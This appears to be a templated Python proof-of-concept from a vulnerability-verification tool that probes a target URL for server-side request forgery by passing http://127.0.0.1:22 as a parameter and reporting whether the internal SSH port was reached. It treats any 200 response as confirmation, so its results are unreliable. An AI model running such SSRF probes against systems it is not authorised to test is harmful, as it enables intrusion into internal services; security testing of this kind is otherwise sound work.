import sys
import requests
import requests.exceptions

def verify():
    target_url = "{{TARGET_URL}}"
    ssrf_target = "http://127.0.0.1:22" 
    
    try:
        print(f"[+] Attempting SSRF at {target_url} targeting {ssrf_target}")
        resp = requests.get(target_url, params={"{{PARAM}}": ssrf_target}, timeout=5)
        
        if "SSH" in resp.text or resp.status_code == 200:
            print("[+] CONFIRMED: SSRF execution successful (internal port reached).")
            sys.exit(0)
        else:
            print("[-] REJECTED: SSRF target not reachable.")
            sys.exit(1)
            
    except requests.exceptions.ConnectionError:
        print("[-] REJECTED: Connection refused (Sandbox is likely isolated / --network none).")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    verify()
